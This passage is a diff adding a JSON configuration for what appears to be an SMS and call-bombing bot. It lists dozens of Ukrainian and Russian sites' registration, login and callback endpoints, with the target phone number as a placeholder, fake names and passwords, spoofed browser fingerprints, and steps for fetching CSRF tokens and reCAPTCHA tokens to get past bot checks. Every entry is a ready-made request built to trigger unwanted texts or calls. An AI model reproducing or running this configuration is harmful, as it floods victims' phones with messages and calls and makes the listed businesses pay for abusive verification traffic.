+      "body": "------WebKitFormBoundaryVenconBotA1\r\nContent-Disposition: form-data; name=\"SignUpForm[full_name]\"\r\n\r\nАнтон\r\n------WebKitFormBoundaryVenconBotA1\r\nContent-Disposition: form-data; name=\"SignUpForm[phone]\"\r\n\r\n{{UA2DASH}}\r\n------WebKitFormBoundaryVenconBotA1\r\nContent-Disposition: form-data; name=\"SignUpForm[email]\"\r\n\r\n{{EMAIL}}\r\n------WebKitFormBoundaryVenconBotA1\r\nContent-Disposition: form-data; name=\"SignUpForm[password]\"\r\n\r\nAnton0000.\r\n------WebKitFormBoundaryVenconBotA1\r\nContent-Disposition: form-data; name=\"SignUpForm[password_repeat]\"\r\n\r\nAnton0000.\r\n------WebKitFormBoundaryVenconBotA1--\r\n",
+      "content_type": "multipart/form-data; boundary=----WebKitFormBoundaryVenconBotA1",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"redirectUrl\"",
+      "api_error": "\"validation\""
+    },
+    {
+      "name": "Pango_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.pango.ua/api/v1/user-register?language=uk",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "ru-RU,ru;q=0.5",
+        "origin": "https://pango.ua",
+        "referer": "https://pango.ua/",
+        "x-analytics-clickid": "179475952054716",
+        "x-analytics-referer": "https://pango.ua/registration",
+        "x-analytics-sessionid": "GA1.1.1847866919.1794759520",
+        "x-mobile-app": "0",
+        "x-csrf-token": "{{CSRF}}"
+      },
+      "body": "{\"lastname\":\"\",\"name\":\"\",\"patronymic\":\"\",\"pesel\":\"\",\"mobile\":\"{{PLUS}}\",\"consents\":[{\"label\":\"Надаю ТОВ «ФК \\\"НЕЗАЛЕЖНІ ФІНАНСИ\\\"» згоди:&nbsp;1)&nbsp;<a href=\\\" https://content.pango.com.ua/uploads/elFinder/docs/zgoda/zgoda_pers_dani_pango.pdf\\\" target=\\\"_blank\\\">на обробку моїх персональних даних</a>;&nbsp;2)&nbsp;<a href=\\\"https://content.pango.com.ua/uploads/elFinder/docs/zgoda/zgoda_NBU_KI_Pango.pdf\\\" target=\\\"_blank\\\">на отримання та передачу даних з системи BankID НБУ та інформації, що складає кредитну історію</a>. Підтверджую, що ознайомлений та приймаю всі умови <a href=\\\"https://pango.com.ua/uploads/credit_rules\\\" target=\\\"_blank\\\">Правил надання коштів та банківських металів у кредит</a>.\",\"value\":\"1a58eff6-33eb-454c-976e-15bbf4ff04cc\",\"required\":true,\"checked\":true}],\"marketing\":{\"channel\":\"site\",\"externalId\":\"179475952054716\",\"instrument\":\"direct\",\"subchannel\":\"pango\",\"browser\":\"chrome\",\"externalId2\":null},\"detectedData\":{\"deviceId\":\"d03d60b753cf73320fb3d7c0126d3088_1847866919.1794759520\",\"deviceTypeId\":\"desktop\",\"deviceModel\":\"linux\",\"hashComponents\":\"key=userAgent;value=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36;key=language;value=ru-RU;key=screenResolution;value=1680,1050;key=timezone;value=Europe/Moscow;\",\"screenResolution\":\"1680,1050\",\"browser\":\"chrome 157.0.0.0\",\"webLanguage\":\"RU-RU\",\"webCountry\":\"Europe/Moscow\"},\"curSum\":15000,\"curTerm\":30,\"promocode\":\"\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"result\":true",
+      "api_error": "\"result\":false",
+      "csrf": {
+        "url": "https://api.pango.ua/api/v1/csrf/generate",
+        "regex": "\"token\"\\s*:\\s*\"([^\"]+)\"",
+        "ttl": 0,
+        "headers": {
+          "accept": "application/json, text/plain, */*",
+          "origin": "https://pango.ua",
+          "referer": "https://pango.ua/",
+          "x-analytics-clickid": "179475952054716",
+          "x-analytics-referer": "https://pango.ua/registration",
+          "x-analytics-sessionid": "GA1.1.1847866919.1794759520",
+          "x-mobile-app": "0"
+        }
+      }
+    },
+    {
+      "name": "Ktc_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://ktc.ua/aj",
+      "headers": {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": "https://ktc.ua",
+        "referer": "https://ktc.ua/",
+        "x-requested-with": "XMLHttpRequest"
+      },
+      "body": "action=u&to=sendcode&locale=0&counter=0&phone={{UA_PAREN_PLUS}}&source=auth&recaptcha_token={{RECAPTCHA}}",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "recaptcha_v3": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdjFr4mAAAAAP_qd3-nQuuxFUmXD09w0tsKA3VF&co=aHR0cHM6Ly9rdGMudWE6NDQz&hl=ru&v=4i3aN5wAweL7i3ADI7BSX4B-&size=invisible"
+    },
+    {
+      "name": "Helsi_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://helsi.me/api/healthy/v2/accounts/login",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://helsi.me",
+        "referer": "https://helsi.me/",
+        "g-recaptcha-response": "{{RECAPTCHA}}"
+      },
+      "body": "{\"phone\":\"{{RAW}}\",\"platform\":\"PISWeb\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "recaptcha_v3": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lfo7I4UAAAAANgj3cIt6AyXbmDuX9KNTHdd96rX&co=aHR0cHM6Ly9oZWxzaS5tZTo0NDM.&hl=ru&v=4i3aN5wAweL7i3ADI7BSX4B-&size=invisible"
+    },
+    {
+      "name": "DniproM_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://dnipro-m.ua/phone-verification/",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json;charset=UTF-8",
+        "origin": "https://dnipro-m.ua",
+        "referer": "https://dnipro-m.ua/",
+        "x-csrf-token": "{{CSRF}}",
+        "x-requested-with": "XMLHttpRequest"
+      },
+      "body": "{\"phone\":\"{{RAW}}\",\"channel\":\"phone\",\"captcha_token\":\"{{RECAPTCHA}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "recaptcha_v3": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdHhTMtAAAAACAFMS0i2wE8CwlW49MHqASt8d2e&co=aHR0cHM6Ly9kbmlwcm8tbS51YTo0NDM.&hl=ru&v=4i3aN5wAweL7i3ADI7BSX4B-&size=invisible",
+      "csrf": {
+        "url": "https://dnipro-m.ua/",
+        "regex": "name=[\"\\']csrf-token[\"\\']\\s+content=[\"\\']([^\"\\']+)[\"\\']",
+        "ttl": 300
+      }
+    },
+    {
+      "name": "Pidbir_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://admin.pidbir.ua/api/auth/employee/verification",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://pidbir.ua",
+        "referer": "https://pidbir.ua/"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"recaptcha_token\":\"{{RECAPTCHA}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "recaptcha_v3": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfXFqEsAAAAAC64p6ZYrRmYoD2uhQKld5RKH16Y&co=aHR0cHM6Ly9waWRiaXIudWE6NDQz&hl=ru&v=4i3aN5wAweL7i3ADI7BSX4B-&size=invisible"
+    },
+    {
+      "name": "Mafia_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://mafia.ua/ua/api/sessions/{{RAW}}",
+      "headers": {
+        "accept": "*/*",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": "https://mafia.ua",
+        "referer": "https://mafia.ua/ua/618",
+        "x-csrf-token": "{{CSRF}}",
+        "x-requested-with": "XMLHttpRequest"
+      },
+      "body": "recaptcha={{RECAPTCHA}}",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "recaptcha_v3": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lfk9ykUAAAAAAUVSjSKRsVG2GiTwUg-XzBxa7KO&co=aHR0cHM6Ly9tYWZpYS51YTo0NDM.&hl=ru&v=4i3aN5wAweL7i3ADI7BSX4B-&size=invisible",
+      "csrf": {
+        "url": "https://mafia.ua/ua/618",
+        "regex": "name=[\"\\']csrf-token[\"\\']\\s+content=[\"\\']([^\"\\']+)[\"\\']",
+        "ttl": 300
+      }
+    },
+    {
+      "name": "dok.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://dok.ua/api/v1/auth/sms",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://dok.ua",
+        "Referer": "https://dok.ua/"
+      },
+      "body": "{\"phone\":\"{{UALOCAL}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "sushi-story",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://sushi-story-api.ithinkers.fun/api/v1/iikoTransport/sushi-story-kyiv-new/user/auth",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://sushi-story.ua",
+        "Referer": "https://sushi-story.ua/"
+      },
+      "body": "{\"account\":\"sushi-story-kyiv-new\",\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "selfiecredit.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.selfiecredit.com.ua/user",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://selfiecredit.ua",
+        "Referer": "https://selfiecredit.ua/"
+      },
+      "body": "{\"mobile_phone\":\"{{RAW}}\",\"date_of_birth\":\"31-12-2000\",\"target_url\":\"https://selfiecredit.ua/\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "kvshop.com.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://kvshop.com.ua/api/v1/phone/verify/",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://kvshop.com.ua",
+        "Referer": "https://kvshop.com.ua/"
+      },
+      "body": "{\"phone\":\"{{UAPAREN}}\",\"transport\":\"flash-call\",\"intent\":\"login\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "holdyou",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://holdyou.net/api/users/registrations",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://holdyou.net",
+        "Referer": "https://holdyou.net/"
+      },
+      "body": "{\"confirm\":true,\"fullname\":\"Олександр Шевченко\",\"email\":\"{{EMAIL}}\",\"username\":\"{{PLUS}}\",\"password\":\"Password123!\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "creditplus.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://creditplus.ua/api/frontend/ua/creditplus/actions/register_step_1.php",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://creditplus.ua",
+        "Referer": "https://creditplus.ua/user/register/step1/"
+      },
+      "body": "csrf_token={{CSRF}}&phone={{UALOCAL}}",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "csrf": {
+        "url": "https://creditplus.ua/user/register/step1/",
+        "regex": "name=\"csrf_token\"\\s+value=\"([^\"]+)\"",
+        "ttl": 300
+      }
+    },
+    {
+      "name": "RozetkaDelivery",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://rz-delivery.rozetka.ua/api/partner/create",
+      "headers": {
+        "accept": "application/json",
+        "content-language": "uk",
+        "origin": "https://rozetka.delivery",
+        "referer": "https://rozetka.delivery/",
+        "version-client": "0.0.214",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
+      },
+      "body": "{\"phone\":\"{{RAW}}\",\"is_aggree_public_data\":true,\"is_aggree_public_offer\":true}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "EPandora_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://e-pandora.ua/api/auth/register/verification",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://e-pandora.ua",
+        "Referer": "https://e-pandora.ua/"
+      },
+      "body": "{\"first_name\":\"марк\",\"phone\":\"{{UALOCAL}}\",\"skip_phone_check\":false}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"success\":true",
+      "api_error": "Поле Телефон має хибний формат"
+    },
+    {
+      "name": "GlobalElectric_UA_CALL",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://callback.ringostat.net/api/initiateCallback/",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://www.globalelectric.com.ua",
+        "Referer": "https://www.globalelectric.com.ua/"
+      },
+      "body": "data%5Bnum_to_call%5D=%2B{{RAW}}&data%5Bua_id%5D=&data%5Bhash%5D=70d8b1a91259a490f18a54cf2e5617be83621ec2&data%5Bclient_id%5D={{UUID}}&data%5Butmz%5D=&data%5Bavg_time_to_call%5D=80&data%5Bpage_url%5D=https%3A%2F%2Fwww.globalelectric.com.ua%2Fcredit%2F&data%5Bhid%5D={{UUID}}&data%5Bverified_user%5D=1",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "SushiIcons_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://sushiicons.com.ua/api/v1/website/auth",
+      "headers": {
+        "Origin": "https://sushiicons.com.ua",
+        "Referer": "https://sushiicons.com.ua/",
+        "Accept": "application/json, text/plain, */*"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"cityId\":10}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"codeSent\":true"
+    },
+    {
+      "name": "SushiIsland_UA_CALL",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://sushi-island.com.ua/wp-admin/admin-ajax.php",
+      "headers": {
+        "Accept": "*/*",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://sushi-island.com.ua",
+        "Referer": "https://sushi-island.com.ua/uk/"
+      },
+      "body": "post_id=6023&form_id=8b64f82&referer_title=%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0+%D0%A1%D1%83%D1%88%D1%96+%D1%82%D0%B0+%D0%A0%D0%BE%D0%BB%D1%96%D0%B2+%D1%83+%D0%97%D0%B0%D0%BF%D0%BE%D1%80%D1%96%D0%B6%D0%B6%D1%96+-+%D0%A1%D1%83%D1%88%D0%B8+Island+-+%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0+%D0%A1%D1%83%D1%88%D0%B8+%D0%B8+%D0%A0%D0%BE%D0%BB%D0%BB%D0%BE%D0%B2+%D0%B2+%D0%97%D0%B0%D0%BF%D0%BE%D1%80%D0%BE%D0%B6%D1%8C%D0%B5&queried_id=3430&form_fields%5Bname%5D=%D0%9E%D0%BB%D0%B5%D0%BA%D1%81%D0%B0%D0%BD%D0%B4%D1%80&form_fields%5Bemail%5D={{RAW}}&action=elementor_pro_forms_send_form&referrer=https%3A%2F%2Fsushi-island.com.ua%2Fuk%2F",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"success\":true"
+    },
+    {
+      "name": "PerlaHelsa_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://back.perlahelsa.ua/api/customer/auth/register/phone?lang=ua",
+      "headers": {
+        "Origin": "https://perlahelsa.ua",
+        "Referer": "https://perlahelsa.ua/",
+        "Accept": "application/json, text/plain, */*"
+      },
+      "body": "{\"firstName\":\"Марк\",\"lastName\":\"Захарченко\",\"email\":\"{{EMAIL}}\",\"phone\":\"{{PLUS}}\",\"mailing\":false,\"password\":\"Password123!\",\"passwordConfirmation\":\"Password123!\",\"remember\":false}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"status\":\"Success\""
+    },
+    {
+      "name": "Apteka911_UA_CALL",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://apteka911.ua/ua/telmed-request",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://apteka911.ua",
+        "Referer": "https://apteka911.ua/ua/"
+      },
+      "body": "phone={{UA6}}&type=consultation",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"result\":\"success\"",
+      "api_error": "\"You have already send request\""
+    },
+    {
+      "name": "StreamTelecom_UA_CALL",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://widgets.streamtele.com/widget/api/phone-widget/create-order/",
+      "headers": {
+        "Origin": "https://streamtele.com",
+        "Referer": "https://streamtele.com/",
+        "Accept": "application/json, text/plain, */*"
+      },
+      "body": "{\"widget_type\":\"day\",\"widget_id\":\"38\",\"phone_number\":\"{{PLUS}}\",\"day\":\"tomorrow\",\"hours\":\"09\",\"minutes\":\"00\",\"additional_data\":\"{\\\"day\\\":\\\"tomorrow\\\",\\\"hours\\\":\\\"09\\\",\\\"minutes\\\":\\\"00\\\",\\\"time\\\":\\\"09:00\\\"}\",\"facebook_fbp\":\"fb.1.1795026408952.567405562772618175\",\"google_ga\":\"GA1.1.1063181033.1795026409\",\"item_type\":\"queue\",\"site_name\":\"streamtele.com\",\"site_page_href\":\"https://streamtele.com/uk/taryfi/\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"message\": \"ok\""
+    },
+    {
+      "name": "MasterZoo",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.masterzoo.ua/ua/auth/api/otp",
+      "headers": {
+        "accept": "application/json",
+        "authorization": "Basic dXNlcjo3MTYzMjAz",
+        "content-type": "application/json",
+        "cookie": "mz_guest_token={{UUID}}; X-Guest-Token={{UUID}}",
+        "origin": "https://masterzoo.ua",
+        "referer": "https://masterzoo.ua/",
+        "x-guest-token": "{{UUID}}",
+        "x-requested-with": "XMLHttpRequest"
+      },
+      "body": "{\"source\":\"{{UA9}}\",\"renew_otp\":true}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "TikToks_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://tik-toks.com/miniapp/send",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "ru-RU,ru;q=0.9",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+        "Origin": "https://tik-toks.com",
+        "Referer": "https://tik-toks.com/sliv",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36"
+      },
+      "body": "{\"phoneNumber\":\"{{PLUS}}\",\"miniapp_id\":\"1331\",\"user_agent\":\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36\",\"type\":\"domain_page\",\"route\":\"1331\",\"phone_source\":\"manual\",\"timezone_offset_min\":180}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"ok\":true",
+      "api_error": "Номер не подходит"
+    },
+    {
+      "name": "Beloris_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://beloris.ru/ajax/users/send_sms_login",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Origin": "https://beloris.ru",
+        "Referer": "https://beloris.ru/login",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "phone={{PLUS}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "api_ok": "\"status\":\"success\"",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Zolotoy585_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.585zolotoy.ru/api/sms/send_code/",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://585zolotoy.ru",
+        "Referer": "https://585zolotoy.ru/"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "api_ok": "next_try_after",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Eda1_RU_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.eda1.ru/api/user/register",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://eda1.ru",
+        "UUID": "{{UUID}}"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\"}",
+      "content_type": "application/json",
+      "api_ok": "\"success\":true",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Eva_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://pwa-api.eva.ua/api/user/send-code?storeCode=ua",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://eva.ua",
+        "Referer": "https://eva.ua/"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "api_ok": "\"code\":200",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "LifecellMNP_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://mnp.lifecell.ua/mnp/get-token/",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://mnp.lifecell.ua",
+        "Referer": "https://mnp.lifecell.ua/"
+      },
+      "body": "{\"msisdn\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "api_ok": "token",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "PizzaHouse_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://pizzahouse.ua/api/v2/auth/sendPin",
+      "headers": {
+        "Accept": "application/json",
+        "Origin": "https://pizzahouse.ua",
+        "Referer": "https://pizzahouse.ua/"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "LadaAutosvetlana_RU_CALLBACK",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://lada.autosvetlana.ru/ajax/send.php",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Origin": "https://lada.autosvetlana.ru",
+        "Referer": "https://lada.autosvetlana.ru/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "phone={{PLUS}}&name=%D0%98%D0%B2%D0%B0%D0%BD&email_title=%D0%97%D0%B0%D1%8F%D0%B2%D0%BA%D0%B0+%D1%81+%D1%81%D0%B0%D0%B9%D1%82%D0%B0&email_addresses=avto%40lada-svetlana.ru",
+      "content_type": "application/x-www-form-urlencoded",
+      "api_ok": "\"status\":\"success\"",
+      "needs_prepare": false,
+      "has_phone": true
+    }
+  ]
+}
